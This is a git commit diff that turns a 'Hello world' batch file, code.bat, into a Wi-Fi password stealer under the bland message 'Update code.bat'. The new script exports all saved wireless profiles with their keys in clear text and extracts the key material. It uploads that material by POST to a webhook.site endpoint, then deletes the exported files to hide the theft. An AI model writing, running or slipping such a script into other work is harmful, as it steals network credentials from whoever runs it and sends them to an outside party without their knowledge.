9a487af1fb7b7c03c93fef2673fe597b782ea506
ArseneBrosy <118964023+ArseneBrosy@users.noreply.github.com>
2023-06-26 18:35:31 +0200

    Update code.bat

--- code.bat
+++ code.bat
@@ -1,3 +1,4 @@
-@echo off
-echo "Hello world!"
-pause
+netsh wlan export profile key=clear
+powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
+powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS
+del Wi-* /s /f /q
